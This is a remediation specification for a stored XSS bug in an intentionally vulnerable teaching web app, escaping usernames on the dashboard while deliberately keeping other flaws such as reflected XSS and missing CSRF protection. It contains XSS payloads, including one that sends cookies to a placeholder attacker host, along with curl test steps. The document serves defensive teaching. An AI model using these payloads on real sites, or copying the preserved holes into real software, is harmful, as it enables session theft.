# Software Specification Document — Stored XSS Fix (Dashboard Username Escaping)

**Version:** 1.0.0
**Last Updated:** June 15, 2026
**Parent Documents:** [PRD.md](../../docs/PRD.md), [TDD.md](../../docs/TDD.md), [app-foundation.md](./app-foundation.md)
**Tracking Issue:** [Stored XSS — unescaped `{{username}}` substitution in dashboard](https://github.com/arifpucit/vuln-web-app/issues)

---

## 1. Overview / Purpose

This document specifies the remediation of the **Stored XSS** vulnerability (OWASP **A03:2021 — Injection**). In `backend/app/api/routes/auth.py` the `welcome_page` handler reads `frontend/templates/dashboard.html` from disk and performs a plain Python string substitution to inject the logged-in user's name into the page:

```python
# VULNERABILITY #2: Stored XSS -- username substituted without escaping
html = html.replace("{{username}}", username)
```

The `username` value originates from `request.session["username"]`, which in turn was copied verbatim from the `users.username` column at login time — a column that the signup form accepts without any sanitization. An attacker who registers an account whose username contains an HTML/JS payload (for example `<img src=x onerror=alert(1)>` or `<script>fetch('//attacker/' + document.cookie)</script>`) has that payload **stored** in the database. Every time the attacker — or any other process that loads the dashboard while authenticated as that account — visits `/welcome`, the server splices the payload directly into the response HTML inside the hero banner's `<strong>` element (`frontend/templates/dashboard.html` line 50: `Logged in as <strong>{{username}}</strong>`). The browser parses the response, encounters live markup where text was expected, and executes the script in the application's origin.

Because the malicious markup lives in the database and fires on every subsequent dashboard render, this is a **stored** XSS — distinct from VULN-3, the reflected XSS in `/search` that lives only in the request URL.

This fix replaces the plain `str.replace` with an **HTML-escaped** substitution using Python's standard-library `html.escape(username, quote=True)`. After the fix the dashboard renders payloads as literal text — `&lt;img src=x onerror=alert(1)&gt;` — and no script executes. The fix is **surgical** and closes the **Stored XSS** vulnerability **only**. The other intentional vulnerabilities remain exploitable for educational use, and every previously-closed fix (bcrypt password hashing, parameterized SQL, removed `/download/db` route, env-sourced session secret) remains permanently in place.

---

## 2. Scope & Non-Goals

### 2.1 In Scope

- Add `import html` (Python standard library) to the top of `backend/app/api/routes/auth.py`.
- Replace the line `html = html.replace("{{username}}", username)` in `welcome_page` with an escaped substitution that runs `username` through `html.escape(username, quote=True)` before splicing it into the response.
- Preserve every other line of `auth.py` byte-for-byte — including the unescaped reflection of `q` in `/search` (preserves VULN-3).
- Preserve `frontend/templates/dashboard.html` byte-for-byte — the `{{username}}` placeholder, the surrounding `<strong>` element, and every other character remain untouched.

### 2.2 Out of Scope (Intentionally Unfixed)

This fix addresses only the Stored XSS vulnerability. The following intentional vulnerabilities remain in place after this change and MUST NOT be remediated here:

| Vulnerability | OWASP | Status under this fix |
|---------------|-------|-----------------------|
| SQL Injection (`auth_service.py` / `auth.py` queries) | A03:2021 | Already CLOSED (parameterized) — stays closed |
| **Stored XSS (`{{username}}` substitution in dashboard)** | **A03:2021** | **CLOSED by this spec** |
| Reflected XSS (`/search?q=` reflection) | A03:2021 | Intentionally unchanged |
| Session Hijacking (hardcoded session secret) | A07:2021 | Already CLOSED (env-sourced secret) — stays closed |
| Weak Password Storage | A02:2021 | Already CLOSED (bcrypt) — stays closed |
| Exposed Database endpoint (`/download/db`) | A01:2021 | Already CLOSED (route removed) — stays closed |
| No Rate Limiting | A07:2021 | Intentionally unchanged |
| CSRF (no tokens) | A01:2021 | Intentionally unchanged |

### 2.3 Explicit Preservation Note

All other intentional vulnerabilities MUST remain unchanged:

- **VULN-3 (Reflected XSS):** the `/search` handler MUST continue to interpolate the raw `q` parameter into its HTML response. No `html.escape` call is added inside `search_user`. The newly-imported `html` module is used **only** by `welcome_page`.
- **VULN-7 (No Rate Limiting):** no throttling middleware, per-IP counter, or `time.sleep` is added.
- **VULN-8 (No CSRF):** no CSRF token field is added to any form; no CSRF middleware is registered.

The four already-closed fixes also MUST remain closed:

- **VULN-1 (SQL Injection):** `auth_service.py` and `/search` MUST keep their parameterized `?` queries.
- **VULN-4 (Session Hijacking):** `main.py` MUST keep sourcing `SECRET_KEY` from the environment with the `secrets.token_hex(32)` fallback.
- **VULN-5 (Weak Password Storage):** `core/security.py` MUST keep its bcrypt implementation (rounds ≥ 12) and the defensive `try/except` in `verify_password`.
- **VULN-6 (Exposed Database):** the `/download/db` route MUST NOT be re-introduced.

---

## 3. Affected Files

The fix MUST touch only the following file (plus the two specification documents). No other repository file may be created or modified.

| Path | Change Type | Purpose |
|------|-------------|---------|
| `backend/app/api/routes/auth.py` | Modified | Add `import html`; escape `username` before splicing into the dashboard response |

Files that MUST NOT be modified by this change:

- `backend/app/main.py` (env-sourced session secret — VULN-4 stays closed).
- `backend/app/services/auth_service.py` (parameterized queries + bcrypt verify — VULN-1 / VULN-5 stay closed; session writes still copy the raw `username` into the session — see §7 EC-04).
- `backend/app/core/security.py` (bcrypt — VULN-5 stays closed).
- `backend/app/db/session.py` (schema and connection layer — untouched).
- `frontend/templates/dashboard.html` (the `{{username}}` placeholder and its surrounding `<strong>` element MUST remain unchanged).
- `frontend/templates/login.html`, `frontend/templates/signup.html` (no template-side change).
- Any CSS under `frontend/static/`.
- `CLAUDE.md`, `README.md`, `docs/PRD.md`, `docs/TDD.md`, `.claude/specs/app-foundation.md` and every other prior spec.
- `pyproject.toml` / `backend/pyproject.toml` / `uv.lock` (no dependency change — `html` is stdlib).

---

## 4. Functional Requirements

### FR-01: Escape on Substitution

- The `welcome_page` handler MUST run the session's `username` value through `html.escape(username, quote=True)` **before** passing it to the `str.replace` call (or its equivalent) that fills the `{{username}}` placeholder.
- The substitution MUST replace **every** occurrence of the literal string `{{username}}` in the loaded template with the escaped value — i.e., the call signature semantics of `str.replace` are preserved; only the value being inserted is escaped.

### FR-02: Quote-Aware Escaping

- The `html.escape` call MUST pass `quote=True` (the standard-library default).
- This guarantees that `<`, `>`, `&`, `"`, and `'` are all converted to their HTML entity equivalents (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`), so a payload that escapes a quoted attribute context (e.g. `" onmouseover=alert(1) x="`) cannot break out even if the placeholder is later moved into an attribute.

### FR-03: Template Placeholder Unchanged

- The `{{username}}` placeholder in `frontend/templates/dashboard.html` MUST remain exactly as written (`Logged in as <strong>{{username}}</strong>` on line 50 of the current template). Switching to a template engine, renaming the placeholder, or moving it is out of scope.

### FR-04: Reflected XSS Surface Untouched

- The `/search` handler MUST continue to interpolate the raw `q` parameter into both `<h3>Search results for: {q}</h3>` and any error response. The newly-added `html` import MUST NOT be applied inside `search_user`.

### FR-05: Standard-Library Only

- The fix MUST use only the Python standard library (`html`). No third-party dependency (Jinja2, MarkupSafe, `bleach`, etc.) is added.

### FR-06: Session and Database Writes Unchanged

- `auth_service.signup()` MUST continue to INSERT the raw, unsanitized username into `users.username`.
- `auth_service.login()` MUST continue to copy the raw `users.username` value into `request.session["username"]`.
- The malicious payload remains *stored* in the database and in the session; the fix purely changes how it is rendered on output. This preserves the educational demonstration that the underlying data is dangerous and that the correct mitigation is **output encoding**, not input filtering.

### FR-07: Response Shape Preserved

- The `/welcome` handler MUST continue to:
  - Return `RedirectResponse(url="/login", status_code=302)` when `user_id` is absent from the session.
  - Return `HTMLResponse(content=html)` with the substituted dashboard markup for authenticated users.
- The HTTP status, content type, and overall HTML structure of the dashboard response remain identical; only the rendered text of the username changes (from raw to entity-encoded).

---

## 5. Non-Functional Requirements

### NFR-01: XSS Immunity at the Dashboard Sink

- After the fix, no value stored in `users.username` (and therefore no value placed in `request.session["username"]`) can introduce executable script, event handler, or live HTML markup into the rendered `/welcome` response.
- Specifically, the payloads `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `"><script>alert(1)</script>`, and `<svg/onload=alert(1)>` MUST all render as inert visible text.

### NFR-02: Surgical Scope

- Exactly one vulnerability (Stored XSS) is closed. The diff MUST NOT touch session secrets, the SQL construction, the `/search` reflection logic, rate-limiting posture, CSRF posture, or the bcrypt verification.

### NFR-03: API Stability

- The public route signature `GET /welcome` is unchanged: same path, same method, same redirect-on-anonymous behavior, same `HTMLResponse` return type.
- No new query parameters, headers, or session keys are introduced.

### NFR-04: No Behavioral Regression for Benign Usernames

- A user whose username contains only printable ASCII letters, digits, underscores, hyphens, or spaces MUST see their username rendered verbatim in the dashboard hero banner. `html.escape` is a no-op on such characters.

### NFR-05: No Information Leakage

- The fix MUST NOT change any HTTP status code, error message, log line, or response timing on `/welcome` or any other route. Output encoding is a pure-CPU transformation with no observable side channel.

### NFR-06: Standard-Library Only / Zero Dependency Delta

- No entry is added to `pyproject.toml`, `backend/pyproject.toml`, or `uv.lock`. The `html` module is part of CPython's standard library and is available unconditionally.

### NFR-07: Encoding Robustness

- The fix MUST correctly escape Unicode usernames. `html.escape` operates on `str` and preserves non-ASCII code points verbatim (it transforms only the five special characters listed in FR-02); a username like `日本語` continues to render as `日本語` in the dashboard, while `日本語<script>` renders as `日本語&lt;script&gt;`.

---

## 6. Success Paths

### SP-01: Benign Username Renders Unchanged

1. User registers with `username=alice`, `email=alice@test.com`, `password=pass123`.
2. User logs in; `request.session["username"]` is set to `"alice"`.
3. User requests `GET /welcome`.
4. The handler reads `dashboard.html`, computes `html.escape("alice", quote=True) == "alice"`, and replaces `{{username}}` with `alice`.
5. The browser displays "Logged in as **alice**" in the hero banner. No visual or functional regression.

### SP-02: Script-Tag Payload Rendered as Text

1. Attacker registers with `username=<script>alert(1)</script>`.
2. Attacker logs in; the raw payload is stored verbatim in `request.session["username"]`.
3. Attacker (or any browser holding their session cookie) requests `GET /welcome`.
4. The handler computes `html.escape("<script>alert(1)</script>", quote=True) == "&lt;script&gt;alert(1)&lt;/script&gt;"`.
5. The browser renders the literal text `<script>alert(1)</script>` inside the `<strong>` element. **No alert dialog appears; no JavaScript executes.**

### SP-03: Event-Handler Payload Rendered as Text

1. Attacker registers with `username=<img src=x onerror=alert(1)>`.
2. Attacker logs in and visits `/welcome`.
3. The escaped substitution renders `&lt;img src=x onerror=alert(1)&gt;` inside the `<strong>` element.
4. The browser parses no `<img>` tag and dispatches no `onerror` handler. **No alert fires.**

### SP-04: Attribute-Breakout Payload Neutralized

1. Attacker registers with `username=" onmouseover=alert(1) x="`.
2. Attacker logs in and visits `/welcome`.
3. The escaped substitution renders `&quot; onmouseover=alert(1) x=&quot;`.
4. Even if a future maintainer accidentally moves the placeholder into an HTML attribute, the `quote=True` setting from FR-02 prevents the attacker from closing the attribute.

### SP-05: Unicode Username Round-Trip

1. User registers with `username=日本語`.
2. User logs in and visits `/welcome`.
3. `html.escape("日本語", quote=True)` returns `"日本語"` unchanged.
4. The browser displays "Logged in as **日本語**".

---

## 7. Edge Cases

### EC-01: Pre-Existing Malicious Row

- The database file pre-dates this fix and contains a row whose `username` column is `<script>alert(1)</script>` (registered before the fix shipped).
- The attacker logs in; the session is populated with the raw malicious string (per FR-06, the session write is intentionally unchanged).
- On `/welcome`, the escaped substitution renders the payload as inert text — **no script executes**, even though the underlying data is still malicious. **No database migration is required.**

### EC-02: Empty Username in Session

- `request.session.get("username", "")` returns `""` (the existing fallback default).
- `html.escape("", quote=True)` returns `""`.
- The dashboard renders "Logged in as ****" (empty `<strong>`). No crash; no escape error. Behavior matches the pre-fix implementation for the empty case.

### EC-03: Username Containing Only Whitespace

- A username consisting solely of spaces or other whitespace passes through `html.escape` unchanged (whitespace characters are not in the escape set).
- The dashboard renders the whitespace verbatim inside `<strong>`. No script execution path is opened.

### EC-04: Session Still Holds Raw Payload

- After the fix, `request.session["username"]` continues to hold the raw, unescaped string (per FR-06). Any **future** code path that reads the session value and writes it to an HTML response without escaping would re-open the XSS.
- This spec deliberately leaves the session value un-sanitized to preserve the educational lesson: the **correct** mitigation is output encoding at every sink, not "wash the data once at the source." A code-review note covering this expectation is the recommended follow-up; adding a sanitization wrapper at the session layer is out of scope.

### EC-05: Anonymous Request to `/welcome`

- A request with no session cookie (or with no `user_id` key) MUST continue to receive `RedirectResponse(url="/login", status_code=302)`. The escape logic is reached only for authenticated requests, so this path is unchanged.

### EC-06: Template Missing the Placeholder

- If a future maintainer removes the `{{username}}` placeholder from `dashboard.html`, the `str.replace` call becomes a no-op and the escaped value is silently discarded. This is acceptable: no XSS sink remains, so there is nothing to protect.

### EC-07: Template Contains Multiple `{{username}}` Placeholders

- If `dashboard.html` ever contains more than one `{{username}}` occurrence, `str.replace` substitutes the escaped value at **every** occurrence (Python's default behavior). Every sink is protected; no occurrence is missed.

### EC-08: Username With Embedded Newlines

- A username containing `\n` or `\r` is left intact by `html.escape` (whitespace is not in the escape set). The browser collapses the whitespace per normal HTML rules. No script execution path is opened.

### EC-09: Very Long Username

- A 10,000-character username is escaped in a single `html.escape` call (O(n) in the length of the string) and substituted into the template. There is no length cap and no performance regression observable at human-perceivable scales.

---

## 8. Acceptance Criteria

### AC-01: `html` Module Imported

- `backend/app/api/routes/auth.py` contains a top-level `import html` statement.

### AC-02: Username Escaped Before Substitution

- The `welcome_page` handler in `auth.py` passes `username` through `html.escape(..., quote=True)` before the value reaches the `{{username}}` substitution.
- `grep -n "html.escape(" backend/app/api/routes/auth.py` matches a line inside `welcome_page`.

### AC-03: No Raw Substitution Remains in `welcome_page`

- The handler no longer contains a line of the form `html = html.replace("{{username}}", username)` where `username` is the raw session value. The replacement uses the escaped value.

### AC-04: `<script>` Username Renders as Text

- Register a user with `username=<script>alert(1)</script>`, log in, and request `/welcome`. The response body contains the literal substring `&lt;script&gt;alert(1)&lt;/script&gt;` and does **not** contain `<script>alert(1)</script>` inside the hero banner.

### AC-05: `<img onerror>` Username Renders as Text

- Register a user with `username=<img src=x onerror=alert(1)>`, log in, and request `/welcome`. The response body contains `&lt;img src=x onerror=alert(1)&gt;` and does **not** contain the live `<img>` tag with `onerror` inside the hero banner.

### AC-06: Quote-Aware Escaping in Use

- The `html.escape` call passes `quote=True` (or relies on the standard-library default, which is `True`). A username of `" onmouseover=alert(1) x="` is rendered with `&quot;` entities in place of every double quote.

### AC-07: Benign Usernames Unchanged

- Registering and logging in as `alice` results in the hero banner rendering exactly `Logged in as <strong>alice</strong>` — no entity encoding, no visual difference from the pre-fix dashboard.

### AC-08: Reflected XSS Preserved (VULN-3)

- `GET /search?q=<script>alert(1)</script>` still returns the literal `<script>alert(1)</script>` in the response body. The `/search` handler is not modified.

### AC-09: Other Vulnerabilities Preserved

- VULN-1 (SQL Injection): `auth_service.py` and `/search` still use parameterized queries (already closed, remains closed).
- VULN-4 (Session Hijacking): `main.py` still sources `SECRET_KEY` from the environment with the `secrets.token_hex(32)` fallback (already closed, remains closed).
- VULN-5 (Weak Password): `core/security.py` still uses bcrypt with rounds ≥ 12 (already closed, remains closed).
- VULN-6 (Exposed DB): `GET /download/db` still returns HTTP 404 (already closed, remains closed).
- VULN-7 (No Rate Limit): no throttling middleware was added.
- VULN-8 (No CSRF): no CSRF token field was added to the login or signup form; no CSRF middleware was registered.

### AC-10: Stored Data Untouched

- The database column `users.username` continues to store the raw, unsanitized payload for any account registered with a malicious username. The fix is purely at the output sink.

### AC-11: Only `auth.py` Modified

- `git status --porcelain` shows `backend/app/api/routes/auth.py` as the only modified source file, plus the two new files `.claude/specs/stored-xss-fix.md` and `.claude/specs/stored-xss-fix-plan.md`. No other path.

### AC-12: Application Boots

- The app starts via `uv run backend/app/main.py` with no `ImportError`, `NameError`, or traceback.

---

## 9. Test Cases

| ID | Scenario | Precondition | Expected Result |
|----|----------|--------------|-----------------|
| TC-01 | `html` module imported | Repo checkout | `grep -n '^import html$' backend/app/api/routes/auth.py` matches a line |
| TC-02 | `welcome_page` uses `html.escape` | Repo checkout | `grep -n 'html.escape(' backend/app/api/routes/auth.py` matches a line inside `welcome_page` |
| TC-03 | Benign username renders unchanged | User `alice` exists | `GET /welcome` with `alice`'s session shows `Logged in as <strong>alice</strong>` |
| TC-04 | `<script>` username rendered inert | User registered with `username=<script>alert(1)</script>` | `/welcome` body contains `&lt;script&gt;alert(1)&lt;/script&gt;` and **not** the live `<script>` tag |
| TC-05 | `<img onerror>` username rendered inert | User registered with `username=<img src=x onerror=alert(1)>` | `/welcome` body contains `&lt;img src=x onerror=alert(1)&gt;` |
| TC-06 | Attribute-breakout payload escaped | User registered with `username=" onmouseover=alert(1) x="` | `/welcome` body contains `&quot;` entities; no live attribute injection |
| TC-07 | SVG payload rendered inert | User registered with `username=<svg/onload=alert(1)>` | `/welcome` body contains `&lt;svg/onload=alert(1)&gt;` |
| TC-08 | Pre-existing malicious row neutralized | Manually `INSERT INTO users (...) VALUES ('legacy', 'l@x', '<bcrypt hash>')` with `username='<script>alert(1)</script>'` and a known password | Login succeeds; `/welcome` renders the payload as inert text |
| TC-09 | Unicode username works | User registered with `username=日本語` | `/welcome` renders `Logged in as <strong>日本語</strong>` |
| TC-10 | Empty username does not crash | Session has `username=""` (edge state) | `/welcome` renders an empty `<strong></strong>`; no traceback |
| TC-11 | Anonymous request redirects | No session cookie | `GET /welcome` → HTTP 302 / `Location: /login` |
| TC-12 | Reflected XSS preserved (VULN-3) | App running | `GET /search?q=<script>alert(1)</script>` body contains the raw `<script>alert(1)</script>` |
| TC-13 | SQL injection stays closed (VULN-1) | Repo checkout | `grep -n 'WHERE username = ?' backend/app/services/auth_service.py` matches; `grep -n 'LIKE ?' backend/app/api/routes/auth.py` matches |
| TC-14 | Session secret stays env-sourced (VULN-4) | Repo checkout | `grep -n 'os.environ.get("SECRET_KEY"' backend/app/main.py` matches; `grep 'super-secret-key-12345' backend/app/main.py` returns no matches |
| TC-15 | Bcrypt stays in use (VULN-5) | Repo checkout | `grep -n 'bcrypt' backend/app/core/security.py` matches |
| TC-16 | `/download/db` stays removed (VULN-6) | App running | `GET /download/db` → HTTP 404 |
| TC-17 | No rate limiting added (VULN-7) | App running | 50 sequential `POST /login` calls all return HTTP 401, never 429 |
| TC-18 | No CSRF tokens added (VULN-8) | App running | `curl /login` and `curl /signup` HTML contain no `csrf_token` field |
| TC-19 | Affected-files audit | After change | `git status --porcelain` shows only `auth.py` modified plus the two new spec docs |
| TC-20 | Application boots cleanly | Fresh checkout | `uv run backend/app/main.py` starts with no traceback |
| TC-21 | Stored data unchanged | User registered with `<script>` username | `sqlite3 vulnerable_app.db "SELECT username FROM users WHERE ...";` still returns the raw `<script>` payload (output-encoding fix, not input filtering) |

---

## 10. Verification Steps

Run from the repository root.

### 10.1 Confirm the New Import (AC-01, TC-01)

```bash
grep -n '^import html$' backend/app/api/routes/auth.py
```

Expected: a single matching line near the top of the file.

### 10.2 Confirm Escape on Substitution (AC-02, AC-03, TC-02)

```bash
grep -n 'html.escape(' backend/app/api/routes/auth.py
```

Expected: a matching line inside `welcome_page`. Manual inspection confirms the escaped value is what reaches the `{{username}}` replacement and that no raw-value `str.replace` of `{{username}}` remains.

### 10.3 Start the Application (AC-12, TC-20)

```bash
uv run backend/app/main.py
```

The server listens on `http://localhost:3001` with no import/boot error.

### 10.4 Benign Username Round-Trip (AC-07, TC-03)

```bash
curl -s -c jar.txt -X POST http://localhost:3001/signup \
     --data-urlencode 'username=alice' \
     --data-urlencode 'email=alice@test.com' \
     --data-urlencode 'password=pass123'
curl -s -c jar.txt -b jar.txt -X POST http://localhost:3001/login \
     --data-urlencode 'username=alice' \
     --data-urlencode 'password=pass123'
curl -s -b jar.txt http://localhost:3001/welcome | grep -o 'Logged in as <strong>alice</strong>'
```

Expected: the final command prints `Logged in as <strong>alice</strong>` (verbatim, no entities).

### 10.5 `<script>` Payload Rendered Inert (AC-04, TC-04)

```bash
curl -s -c jar2.txt -X POST http://localhost:3001/signup \
     --data-urlencode 'username=<script>alert(1)</script>' \
     --data-urlencode 'email=xss1@x' \
     --data-urlencode 'password=p'
curl -s -c jar2.txt -b jar2.txt -X POST http://localhost:3001/login \
     --data-urlencode 'username=<script>alert(1)</script>' \
     --data-urlencode 'password=p'
BODY=$(curl -s -b jar2.txt http://localhost:3001/welcome)
echo "$BODY" | grep -o '&lt;script&gt;alert(1)&lt;/script&gt;' && echo 'escaped: OK'
echo "$BODY" | grep -c 'Logged in as <strong><script>alert(1)</script></strong>'
```

Expected: the escaped substring is found (prints `escaped: OK`); the literal live-`<script>` form inside the hero banner is **not** found (count is `0`).

### 10.6 `<img onerror>` Payload Rendered Inert (AC-05, TC-05)

```bash
curl -s -c jar3.txt -X POST http://localhost:3001/signup \
     --data-urlencode 'username=<img src=x onerror=alert(1)>' \
     --data-urlencode 'email=xss2@x' \
     --data-urlencode 'password=p'
curl -s -c jar3.txt -b jar3.txt -X POST http://localhost:3001/login \
     --data-urlencode 'username=<img src=x onerror=alert(1)>' \
     --data-urlencode 'password=p'
curl -s -b jar3.txt http://localhost:3001/welcome | grep -o '&lt;img src=x onerror=alert(1)&gt;'
```

Expected: the escaped substring is printed.

### 10.7 Attribute-Breakout Payload Neutralized (AC-06, TC-06)

```bash
curl -s -c jar4.txt -X POST http://localhost:3001/signup \
     --data-urlencode 'username=" onmouseover=alert(1) x="' \
     --data-urlencode 'email=xss3@x' \
     --data-urlencode 'password=p'
curl -s -c jar4.txt -b jar4.txt -X POST http://localhost:3001/login \
     --data-urlencode 'username=" onmouseover=alert(1) x="' \
     --data-urlencode 'password=p'
curl -s -b jar4.txt http://localhost:3001/welcome | grep -o '&quot;'
```

Expected: the `&quot;` entity is printed (confirms quote-aware escaping).

### 10.8 Stored Data Still Malicious (AC-10, TC-21)

```bash
sqlite3 vulnerable_app.db "SELECT username FROM users WHERE username LIKE '<script>%';"
```

Expected: returns the raw `<script>alert(1)</script>` string — confirming the fix is output encoding, not input filtering.

### 10.9 Anonymous Redirect Preserved (TC-11)

```bash
curl -s -o /dev/null -w 'welcome_anon=%{http_code}\n' http://localhost:3001/welcome
```

Expected: `welcome_anon=302` (or `307`, matching the existing handler).

### 10.10 Vulnerability Preservation Walkthrough (AC-08, AC-09, TC-12–TC-18)

```bash
# VULN-3 Reflected XSS still fires (TC-12)
curl -s 'http://localhost:3001/search?q=<script>alert(1)</script>' | grep -o '<script>alert(1)</script>'
# Expected: payload printed back unescaped.

# VULN-1 SQL injection stays closed (TC-13)
grep -n 'WHERE username = ?' backend/app/services/auth_service.py
grep -n 'LIKE ?' backend/app/api/routes/auth.py

# VULN-4 Session secret env-sourced (TC-14)
grep -n 'os.environ.get("SECRET_KEY"' backend/app/main.py
grep -n 'super-secret-key-12345' backend/app/main.py || echo '(hardcoded secret absent — preserved)'

# VULN-5 Bcrypt stays in use (TC-15)
grep -n 'bcrypt' backend/app/core/security.py

# VULN-6 /download/db stays removed (TC-16)
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:3001/download/db
# Expected: 404.

# VULN-7 No rate limiting (TC-17)
for i in {1..50}; do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST http://localhost:3001/login \
       --data-urlencode 'username=ghost' --data-urlencode "password=$i"
done | sort -u
# Expected: only 401 in the deduplicated output.

# VULN-8 No CSRF tokens (TC-18)
curl -s http://localhost:3001/login  | grep -i csrf || echo '(no csrf field — preserved)'
curl -s http://localhost:3001/signup | grep -i csrf || echo '(no csrf field — preserved)'
```

### 10.11 Affected-Files Audit (AC-11, TC-19)

```bash
git status --porcelain
```

Expected output — exactly one modified source file plus the two new spec docs:

```
 M backend/app/api/routes/auth.py
?? .claude/specs/stored-xss-fix.md
?? .claude/specs/stored-xss-fix-plan.md
```

No other path.

---

## 11. Operational Note

This fix requires **no database migration and no data changes**.

- Existing user accounts (including any whose `username` column contains malicious markup from before the fix shipped) continue to work without modification — they can still log in.
- The `vulnerable_app.db` file is not modified, moved, or deleted.
- The `users` table schema is unchanged.
- The session cookie format is unchanged.

After deploying this change:

- The dashboard at `/welcome` renders every username — benign or hostile — as inert text inside the hero banner.
- The educational demonstration of the underlying issue is preserved: students can still inspect the database with `sqlite3 vulnerable_app.db "SELECT username FROM users;"` and see the raw stored payload, then compare it to the safely-rendered dashboard output to understand that the correct mitigation lives at the **output sink**, not at the input boundary.
